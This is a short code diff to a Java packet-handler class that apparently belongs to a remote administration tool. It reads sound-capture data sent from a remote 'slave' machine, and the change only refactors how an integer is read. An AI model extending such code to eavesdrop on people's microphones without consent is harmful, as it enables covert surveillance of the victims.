@@ -10,7 +10,6 @@ import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.SourceDataLine;
-import java.io.DataInputStream;
 
 
 public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
@@ -21,8 +20,8 @@ public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
 	private static boolean initialized;
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
-		int quality = dis.readInt();
+	public void read(Slave slave) throws Exception {
+		int quality = slave.readInt();
 		
 		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.INSTANCES.get(slave);
 		if (!initialized) {
